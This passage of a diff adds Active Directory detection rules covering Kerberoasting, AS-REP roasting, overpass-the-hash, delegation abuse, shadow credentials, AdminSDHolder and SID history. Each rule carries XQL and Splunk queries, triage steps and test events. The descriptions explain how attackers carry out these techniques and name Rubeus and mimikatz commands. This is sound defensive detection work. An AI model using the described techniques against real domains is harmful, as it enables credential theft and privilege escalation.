+      "not": {
+       "sel": "krbtgt"
+      }
+     }
+    ]
+   },
+   "condition_text": "tgs and not machine_or_krbtgt and not krbtgt",
+   "triage": [
+    "Many 4769 RC4 requests from one account in a short time is Kerberoasting. A single one may be an old client.",
+    "Give the targeted service accounts long random passwords or move them to gMSA."
+   ],
+   "false_positives": [
+    "Old applications and service accounts still limited to RC4. Fix them (msDS-SupportedEncryptionTypes) and the rule gets quiet."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_service_name = json_extract_scalar(action_evtlog_data_fields, \"$.ServiceName\"), evt_ticket_encryption = json_extract_scalar(action_evtlog_data_fields, \"$.TicketEncryptionType\")\n| filter ((action_evtlog_event_id = 4769 and evt_ticket_encryption = \"0x17\") and not ((evt_service_name != null and evt_service_name ~= \"(?i)\\\\$$\"))) and not ((evt_service_name != null and evt_service_name ~= \"(?i)^krbtgt\"))\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where ((EventCode=4769 AND lower(TicketEncryptionType)=\"0x17\") AND NOT ((isnotnull(ServiceName) AND match(ServiceName, \"(?i)\\\\$$\")))) AND NOT ((isnotnull(ServiceName) AND match(ServiceName, \"(?i)^krbtgt\")))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4769,
+      "target.user": "studentx@CORP.LOCAL",
+      "service.name": "svcadmin",
+      "ticket.encryption": "0x17"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4769,
+      "service.name": "DCORP-MGMT$",
+      "ticket.encryption": "0x17"
+     },
+     {
+      "event.id": 4769,
+      "service.name": "svcadmin",
+      "ticket.encryption": "0x12"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0048",
+   "title": "TGT issued without Kerberos pre-authentication (AS-REP roasting)",
+   "description": "Event 4768 with pre-authentication type 0 means the account has \"Do not require Kerberos preauthentication\" set, and anyone can request a TGT for it and crack the reply offline.",
+   "attack": [
+    "T1558.004"
+   ],
+   "tactic": "credential-access",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "as_req": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4768"
+      ]
+     },
+     {
+      "field": "preauth.type",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "0"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "as_req"
+   },
+   "condition_text": "as_req",
+   "triage": [
+    "Turn pre-authentication back on for the account and reset its password.",
+    "Check who else has DONT_REQ_PREAUTH (Get-DomainUser -PreauthNotRequired) and who can set it."
+   ],
+   "false_positives": [
+    "Accounts that really need no pre-auth (rare, some old Unix integrations). List them and review why."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_preauth_type = json_extract_scalar(action_evtlog_data_fields, \"$.PreAuthType\")\n| filter action_evtlog_event_id = 4768 and evt_preauth_type = \"0\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4768 AND lower(PreAuthType)=\"0\"\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4768,
+      "target.user": "VPN1user",
+      "preauth.type": "0",
+      "ticket.encryption": "0x17"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4768,
+      "target.user": "s.benali",
+      "preauth.type": "2"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0049",
+   "title": "TGT requested with RC4 encryption (possible overpass-the-hash)",
+   "description": "Event 4768 with encryption 0x17. Modern Windows clients ask for AES. A TGT requested with RC4 is what you see when an NTLM hash is turned into a Kerberos ticket (Rubeus asktgt /rc4, mimikatz sekurlsa::pth).",
+   "attack": [
+    "T1550.002"
+   ],
+   "tactic": "lateral-movement",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "as_req": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4768"
+      ]
+     },
+     {
+      "field": "ticket.encryption",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "0x17"
+      ]
+     }
+    ],
+    "no_preauth": [
+     {
+      "field": "preauth.type",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "0"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "as_req"
+     },
+     {
+      "not": {
+       "sel": "no_preauth"
+      }
+     }
+    ]
+   },
+   "condition_text": "as_req and not no_preauth",
+   "triage": [
+    "Check where the hash came from. The source host in the event is the attacker's foothold.",
+    "Disable RC4 in the domain where possible, so this becomes a high-fidelity signal."
+   ],
+   "false_positives": [
+    "Accounts and devices that only support RC4. They are the same every day, so baseline them."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_ticket_encryption = json_extract_scalar(action_evtlog_data_fields, \"$.TicketEncryptionType\"), evt_preauth_type = json_extract_scalar(action_evtlog_data_fields, \"$.PreAuthType\")\n| filter (action_evtlog_event_id = 4768 and evt_ticket_encryption = \"0x17\") and not ((evt_preauth_type != null and evt_preauth_type = \"0\"))\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where (EventCode=4768 AND lower(TicketEncryptionType)=\"0x17\") AND NOT ((isnotnull(PreAuthType) AND lower(PreAuthType)=\"0\"))\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4768,
+      "target.user": "techadmin",
+      "ticket.encryption": "0x17",
+      "preauth.type": "2",
+      "source.ip": "::ffff:172.16.100.1"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4768,
+      "target.user": "techadmin",
+      "ticket.encryption": "0x12",
+      "preauth.type": "2"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0050",
+   "title": "TGT requested with a certificate (PKINIT)",
+   "description": "Event 4768 with pre-authentication type 16 or 17 means the account logged on with a certificate. In a domain without smart cards this is rare, and it is how a certificate obtained through AD CS abuse or shadow credentials is turned into a login.",
+   "attack": [
+    "T1649",
+    "T1550"
+   ],
+   "tactic": "credential-access",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "pkinit": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4768"
+      ]
+     },
+     {
+      "field": "preauth.type",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "15",
+       "16",
+       "17"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "pkinit"
+   },
+   "condition_text": "pkinit",
+   "triage": [
+    "Find the certificate (serial and issuer are in the event) and when it was issued on the CA (4886/4887).",
+    "If the account is privileged and does not use smart cards, revoke the certificate and check the template it came from."
+   ],
+   "false_positives": [
+    "Smart card and Windows Hello for Business logons. Exclude the accounts and devices that use them."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_preauth_type = json_extract_scalar(action_evtlog_data_fields, \"$.PreAuthType\")\n| filter action_evtlog_event_id = 4768 and evt_preauth_type in (\"15\", \"16\", \"17\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4768 AND (lower(PreAuthType)=\"15\" OR lower(PreAuthType)=\"16\" OR lower(PreAuthType)=\"17\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4768,
+      "target.user": "techadmin",
+      "preauth.type": "16"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4768,
+      "target.user": "techadmin",
+      "preauth.type": "2"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0051",
+   "title": "Service ticket issued through delegation (S4U2Proxy)",
+   "description": "Event 4769 with a value in Transmitted Services means a service asked for a ticket on behalf of a user (constrained or resource-based delegation). Attackers who control a computer account with delegation rights use it to impersonate administrators to another host. Useful as a hunt; legitimate delegation creates the same event.",
+   "attack": [
+    "T1558",
+    "T1134.001"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "low",
+   "logsource": "windows_event",
+   "selections": {
+    "delegated": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4769"
+      ]
+     },
+     {
+      "field": "ticket.transmitted_services",
+      "op": "re",
+      "all": false,
+      "values": [
+       "\\w"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "delegated"
+   },
+   "condition_text": "delegated",
+   "triage": [
+    "Check the impersonated account. A domain admin being delegated to a server that never needed it is the red flag.",
+    "Review msDS-AllowedToActOnBehalfOfOtherIdentity on the target service's computer (DL-0052)."
+   ],
+   "false_positives": [
+    "Web and SQL front ends that use constrained delegation. Baseline which services delegate to which."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_ticket_transmitted_services = json_extract_scalar(action_evtlog_data_fields, \"$.TransmittedServices\")\n| filter action_evtlog_event_id = 4769 and evt_ticket_transmitted_services ~= \"(?i)\\\\w\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4769 AND match(TransmittedServices, \"(?i)\\\\w\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4769,
+      "target.user": "STUDVM$@TECH.CORP",
+      "service.name": "MGMTSRV$",
+      "ticket.transmitted_services": "studvm$@TECH.CORP"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4769,
+      "target.user": "s.benali@TECH.CORP",
+      "service.name": "FS01$",
+      "ticket.transmitted_services": "-"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0052",
+   "title": "Resource-based constrained delegation written on an object",
+   "description": "Event 5136 changing msDS-AllowedToActOnBehalfOfOtherIdentity. Whoever is listed there can impersonate any user to that computer. With write rights on a computer object (for example GenericWrite), an attacker adds a machine account they control and then uses S4U to become an administrator on it.",
+   "attack": [
+    "T1098",
+    "T1134.001"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "rbcd": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5136"
+      ]
+     },
+     {
+      "field": "attribute.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "msDS-AllowedToActOnBehalfOfOtherIdentity"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "rbcd"
+   },
+   "condition_text": "rbcd",
+   "triage": [
+    "Read the new security descriptor to see which account was granted, then clear the attribute.",
+    "Find who could write to the computer object (the ACL path) and remove that right."
+   ],
+   "false_positives": [
+    "Admins setting up RBCD for a real application. Rare and should be change-managed."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_attribute_name = json_extract_scalar(action_evtlog_data_fields, \"$.AttributeLDAPDisplayName\")\n| filter action_evtlog_event_id = 5136 and evt_attribute_name = \"msds-allowedtoactonbehalfofotheridentity\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=5136 AND lower(AttributeLDAPDisplayName)=\"msds-allowedtoactonbehalfofotheridentity\"\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5136,
+      "subject.user": "STUDVM$",
+      "object.dn": "CN=mgmtsrv,CN=Computers,DC=tech,DC=corp",
+      "object.class": "computer",
+      "attribute.name": "msDS-AllowedToActOnBehalfOfOtherIdentity"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5136,
+      "object.dn": "CN=mgmtsrv,CN=Computers,DC=tech,DC=corp",
+      "attribute.name": "description"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0053",
+   "title": "Constrained delegation configured on an account",
+   "description": "Event 5136 changing msDS-AllowedToDelegateTo. The account can then get tickets as any user for the listed services, and the service name in the ticket can be swapped for another service on the same host (for example TIME to LDAP or CIFS).",
+   "attack": [
+    "T1098",
+    "T1134.001"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "kcd": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5136"
+      ]
+     },
+     {
+      "field": "attribute.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "msDS-AllowedToDelegateTo"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "kcd"
+   },
+   "condition_text": "kcd",
+   "triage": [
+    "Check the services listed. Delegation to a domain controller (LDAP, CIFS, HOST, TIME) is as good as Domain Admin.",
+    "Prefer resource-based delegation scoped to the exact service, and mark admins as not delegatable."
+   ],
+   "false_positives": [
+    "Planned delegation for web or SQL front ends. Review with the application owner."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_attribute_name = json_extract_scalar(action_evtlog_data_fields, \"$.AttributeLDAPDisplayName\")\n| filter action_evtlog_event_id = 5136 and evt_attribute_name = \"msds-allowedtodelegateto\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=5136 AND lower(AttributeLDAPDisplayName)=\"msds-allowedtodelegateto\"\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5136,
+      "object.dn": "CN=adminsrv,CN=Computers,DC=corp,DC=local",
+      "attribute.name": "msDS-AllowedToDelegateTo",
+      "attribute.value": "TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5136,
+      "attribute.name": "servicePrincipalName",
+      "object.class": "computer"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0054",
+   "title": "Key credential added to an account (shadow credentials)",
+   "description": "Event 5136 writing msDS-KeyCredentialLink. Windows Hello for Business writes this attribute on enrollment, but an attacker with write rights on an account can add their own key and then log on as that account with a certificate (PKINIT), without knowing or changing its password.",
+   "attack": [
+    "T1098",
+    "T1556"
+   ],
+   "tactic": "persistence",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "key_link": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5136"
+      ]
+     },
+     {
+      "field": "attribute.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "msDS-KeyCredentialLink"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "key_link"
+   },
+   "condition_text": "key_link",
+   "triage": [
+    "If the writer is not the device itself, list and remove unknown keys on the account (Whisker list / Get-ADUser -Properties msDS-KeyCredentialLink).",
+    "Expect a PKINIT logon for the same account soon after (DL-0050)."
+   ],
+   "false_positives": [
+    "Windows Hello for Business enrollment. Those are written by the computer account of the device, for the user who enrolled."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_attribute_name = json_extract_scalar(action_evtlog_data_fields, \"$.AttributeLDAPDisplayName\")\n| filter action_evtlog_event_id = 5136 and evt_attribute_name = \"msds-keycredentiallink\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=5136 AND lower(AttributeLDAPDisplayName)=\"msds-keycredentiallink\"\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5136,
+      "subject.user": "studentx",
+      "object.dn": "CN=techservice,CN=Users,DC=tech,DC=corp",
+      "attribute.name": "msDS-KeyCredentialLink"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5136,
+      "attribute.name": "msDS-AllowedToDelegateTo"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0055",
+   "title": "Service principal name added to a user account (targeted Kerberoasting)",
+   "description": "Event 5136 writing servicePrincipalName on a user object. With write rights on a user, an attacker can add any SPN, request a service ticket for it and crack the user's password offline, then remove the SPN again.",
+   "attack": [
+    "T1558.003",
+    "T1098"
+   ],
+   "tactic": "credential-access",
+   "severity": "medium",
+   "logsource": "windows_event",
+   "selections": {
+    "spn": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5136"
+      ]
+     },
+     {
+      "field": "attribute.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "servicePrincipalName"
+      ]
+     },
+     {
+      "field": "object.class",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "user"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "spn"
+   },
+   "condition_text": "spn",
+   "triage": [
+    "Check for an RC4 service ticket for that account right after (DL-0047) and whether the SPN was removed again.",
+    "Reset the account's password to a long random value."
+   ],
+   "false_positives": [
+    "Admins creating a service account for a new application."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_object_class = json_extract_scalar(action_evtlog_data_fields, \"$.ObjectClass\"), evt_attribute_name = json_extract_scalar(action_evtlog_data_fields, \"$.AttributeLDAPDisplayName\")\n| filter action_evtlog_event_id = 5136 and evt_attribute_name = \"serviceprincipalname\" and evt_object_class = \"user\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=5136 AND lower(AttributeLDAPDisplayName)=\"serviceprincipalname\" AND lower(ObjectClass)=\"user\"\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5136,
+      "object.dn": "CN=support1user,CN=Users,DC=corp,DC=local",
+      "object.class": "user",
+      "attribute.name": "servicePrincipalName",
+      "attribute.value": "dcorp/whatever1"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5136,
+      "object.class": "computer",
+      "attribute.name": "servicePrincipalName"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0056",
+   "title": "Permissions changed on AdminSDHolder or the domain root",
+   "description": "Event 5136 changing nTSecurityDescriptor on CN=AdminSDHolder or on the domain object itself. An ACE on AdminSDHolder is copied to every protected group and admin account every hour. An ACE on the domain root can grant DCSync rights. Both are persistence that survives password resets.",
+   "attack": [
+    "T1098",
+    "T1222.001"
+   ],
+   "tactic": "persistence",
+   "severity": "critical",
+   "logsource": "windows_event",
+   "selections": {
+    "dacl": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "5136"
+      ]
+     },
+     {
+      "field": "attribute.name",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "nTSecurityDescriptor"
+      ]
+     }
+    ],
+    "sensitive_object": [
+     {
+      "field": "object.dn",
+      "op": "re",
+      "all": false,
+      "values": [
+       "^(cn=adminsdholder,cn=system,)?dc=[^,]+(,dc=[^,]+)*$"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "and": [
+     {
+      "sel": "dacl"
+     },
+     {
+      "sel": "sensitive_object"
+     }
+    ]
+   },
+   "condition_text": "dacl and sensitive_object",
+   "triage": [
+    "Compare the ACL with a known good copy and remove principals that should not be there.",
+    "On AdminSDHolder, wait for or force SDProp after the fix, then check protected accounts again."
+   ],
+   "false_positives": [
+    "Rare. Some identity products need rights on the domain root at install time."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\"), evt_object_dn = json_extract_scalar(action_evtlog_data_fields, \"$.ObjectDN\"), evt_attribute_name = json_extract_scalar(action_evtlog_data_fields, \"$.AttributeLDAPDisplayName\")\n| filter (action_evtlog_event_id = 5136 and evt_attribute_name = \"ntsecuritydescriptor\") and evt_object_dn ~= \"(?i)^(cn=adminsdholder,cn=system,)?dc=[^,]+(,dc=[^,]+)*$\"\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where (EventCode=5136 AND lower(AttributeLDAPDisplayName)=\"ntsecuritydescriptor\") AND match(ObjectDN, \"(?i)^(cn=adminsdholder,cn=system,)?dc=[^,]+(,dc=[^,]+)*$\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 5136,
+      "subject.user": "studentx",
+      "object.dn": "CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local",
+      "attribute.name": "nTSecurityDescriptor"
+     },
+     {
+      "event.id": 5136,
+      "object.dn": "DC=dollarcorp,DC=moneycorp,DC=local",
+      "attribute.name": "nTSecurityDescriptor"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 5136,
+      "object.dn": "CN=Users,DC=dollarcorp,DC=moneycorp,DC=local",
+      "attribute.name": "nTSecurityDescriptor"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0057",
+   "title": "Member added to a privileged domain group",
+   "description": "Events 4728, 4732 and 4756 (member added to a global, local or universal group) for Domain Admins, Enterprise Admins, Schema Admins, Administrators and the operator groups. These groups change rarely, so every addition deserves a look.",
+   "attack": [
+    "T1098.007"
+   ],
+   "tactic": "persistence",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "added": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4728",
+       "4732",
+       "4756"
+      ]
+     },
+     {
+      "field": "target.user",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "Domain Admins",
+       "Enterprise Admins",
+       "Schema Admins",
+       "Administrators",
+       "Account Operators",
+       "Backup Operators",
+       "Server Operators",
+       "DnsAdmins",
+       "Group Policy Creator Owners",
+       "Key Admins",
+       "Enterprise Key Admins"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "added"
+   },
+   "condition_text": "added",
+   "triage": [
+    "Confirm with the person who made the change (subject account). If nobody expected it, remove the member and reset the account.",
+    "Look at the member's recent logons and what they touched with the new rights."
+   ],
+   "false_positives": [
+    "Planned admin changes. Match them against change tickets."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\")\n| filter action_evtlog_event_id in (4728, 4732, 4756) and evt_target_user in (\"domain admins\", \"enterprise admins\", \"schema admins\", \"administrators\", \"account operators\", \"backup operators\", \"server operators\", \"dnsadmins\", \"group policy creator owners\", \"key admins\", \"enterprise key admins\")\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where (EventCode=4728 OR EventCode=4732 OR EventCode=4756) AND (lower(TargetUserName)=\"domain admins\" OR lower(TargetUserName)=\"enterprise admins\" OR lower(TargetUserName)=\"schema admins\" OR lower(TargetUserName)=\"administrators\" OR lower(TargetUserName)=\"account operators\" OR lower(TargetUserName)=\"backup operators\" OR lower(TargetUserName)=\"server operators\" OR lower(TargetUserName)=\"dnsadmins\" OR lower(TargetUserName)=\"group policy creator owners\" OR lower(TargetUserName)=\"key admins\" OR lower(TargetUserName)=\"enterprise key admins\")\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4728,
+      "subject.user": "techservice",
+      "target.user": "Domain Admins",
+      "member.name": "CN=studentx,CN=Users,DC=corp,DC=local"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4728,
+      "target.user": "Marketing",
+      "member.name": "CN=a.trabelsi,CN=Users,DC=corp,DC=local"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0058",
+   "title": "SID history added to an account",
+   "description": "Events 4765 and 4766 are written when SID history is added to an account, or the attempt fails. A SID from a privileged group in SID history gives those rights everywhere the SID is accepted, including across trusts without SID filtering. Outside a domain migration this should never happen.",
+   "attack": [
+    "T1134.005"
+   ],
+   "tactic": "privilege-escalation",
+   "severity": "critical",
+   "logsource": "windows_event",
+   "selections": {
+    "sid_history": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4765",
+       "4766"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "sid_history"
+   },
+   "condition_text": "sid_history",
+   "triage": [
+    "Read the SID added. -519 (Enterprise Admins) or -512 (Domain Admins) from another domain means a trust attack.",
+    "Clear SID history on the account and make sure SID filtering is on for external and forest trusts."
+   ],
+   "false_positives": [
+    "Domain migrations with ADMT. Those are planned and run from the migration account."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\")\n| filter action_evtlog_event_id in (4765, 4766)\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4765 OR EventCode=4766\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4765,
+      "target.user": "studentx",
+      "sid_history": "S-1-5-21-335606122-960912869-3279953914-519"
+     }
+    ],
+    "no_match": [
+     {
+      "event.id": 4738,
+      "target.user": "studentx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "DL-0059",
+   "title": "DSRM administrator password changed",
+   "description": "Event 4794 on a domain controller: someone set the Directory Services Restore Mode administrator password. Combined with DsrmAdminLogonBehavior (DL-0041), that account becomes a quiet backdoor into the DC.",
+   "attack": [
+    "T1098"
+   ],
+   "tactic": "persistence",
+   "severity": "high",
+   "logsource": "windows_event",
+   "selections": {
+    "dsrm": [
+     {
+      "field": "event.id",
+      "op": "eq",
+      "all": false,
+      "values": [
+       "4794"
+      ]
+     }
+    ]
+   },
+   "condition": {
+    "sel": "dsrm"
+   },
+   "condition_text": "dsrm",
+   "triage": [
+    "Check the subject account and whether a change was planned. If not, reset the DSRM password and check DL-0041 on the same DC."
+   ],
+   "false_positives": [
+    "DC builds and planned DSRM password rotation."
+   ],
+   "xql": "config case_sensitive = false\n| dataset = xdr_data\n| filter event_type = ENUM.EVENT_LOG\n| alter evt_subject_user = json_extract_scalar(action_evtlog_data_fields, \"$.SubjectUserName\"), evt_target_user = json_extract_scalar(action_evtlog_data_fields, \"$.TargetUserName\")\n| filter action_evtlog_event_id = 4794\n| fields _time, agent_hostname, action_evtlog_event_id, evt_subject_user, evt_target_user, action_evtlog_message\n| sort desc _time\n| limit 1000\n",
+   "spl": "`wineventlog`\n| where EventCode=4794\n| table _time host EventCode SubjectUserName TargetUserName Message\n| sort - _time\n",
+   "tests": {
+    "match": [
+     {
+      "event.id": 4794,
+      "subject.user": "Administrator"
+     }
+    ],
